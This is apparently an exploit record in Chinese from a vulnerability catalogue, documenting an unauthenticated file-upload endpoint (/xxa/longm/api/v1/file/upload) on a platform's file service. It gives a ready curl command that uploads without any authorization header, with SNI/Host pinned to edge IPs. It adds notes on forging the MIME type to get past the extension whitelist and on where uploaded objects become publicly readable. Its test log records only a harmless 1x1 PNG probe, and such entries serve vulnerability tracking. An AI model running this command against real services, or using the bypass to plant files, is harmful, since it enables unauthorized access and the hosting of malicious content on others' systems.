# /xxa/longm/api/v1/file/upload 未授权文件上传（multipart，无 Authorization）

- **code**: xxa-longm-api-v1-file-upload-未授权文件上传-multipart-无-authorization
- **kind**: exp
- **category**: file-upload
- **component**: xxa longm file service (6T/dysaas 平台)
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-08 在 example.com（边缘 203.0.113.48 与 203.0.113.93）实测：无任何认证头，multipart 只带 file 字段，HTTP 200 + {"code":0,"data":{"url":"/mujun-certificate/202610/319c8d78631643d39c8330271dd5d612.png",...},"msg":"SUCCESS"}；另一轮同请求返回 d443ec43f3604c1bab93713be0573de2.png。仅上传 1x1 PNG 探针，未传恶意内容。对应 vuln_id=34。
- **tags**: 未授权,文件上传,对象存储,S3,白名单绕过
- **created_at**: 2026-10-08T15:38:49.168Z
- **found_by**: exploit

## 描述

平台文件服务的 multipart 上传接口 /xxa/longm/api/v1/file/upload 未做鉴权：不带 Authorization / Cookie / CECU_TOKEN 也能上传成功，响应返回对象存储相对路径（/mujun-certificate/YYYYMM/<uuid>.<ext>），落地后公开可读。上传内容与 Content-Type 不受限（可用伪造 MIME 绕过扩展名白名单）。

## 用法

```
curl -k -sS --connect-to "example.com:443:203.0.113.93:443" -H "Host: example.com" \
  -H "Accept: application/vnd.dysaas.v1+json" \
  -F "file=@local.png;type=image/png" \
  "https://example.com/xxa/longm/api/v1/file/upload"
# 关键点：不加 Authorization；必须对齐 SNI/Host（--connect-to 到边缘 IP）。
# 响应 data.url = /mujun-certificate/<YYYYMM>/<uuid>.png -> 落地 https://web01.example.com:51010/file<data.url>
```
